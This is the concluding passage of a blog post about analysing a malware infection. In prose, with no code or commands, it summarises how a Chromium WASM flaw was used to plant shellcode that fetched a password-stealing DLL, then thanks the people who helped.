Starting with an antivirus alert, we used Process Monitor and WinDbg to gather important details, and then uncovered each layer of the malicious code with reverse engineering.
We found that a Chromium vulnerability involving WASM and out-of-bounds memory access was exploited to write shellcode into executable memory.
Finally, we discovered that the shellcode downloads a malicious DLL file that steals passwords and personal information.</p> <p>Shout-out to <a href="https://elliott.diy/" rel="nofollow">Elliott</a> for helping out with the DLL analysis, and a big thank-you to my dad for walking me through WinDbg!</p> <p>And of course, thank <em>you</em> for reading! If you liked this post, please share the link anywhere you like.</p><!----><!----></div></div>
  </body>
</html>
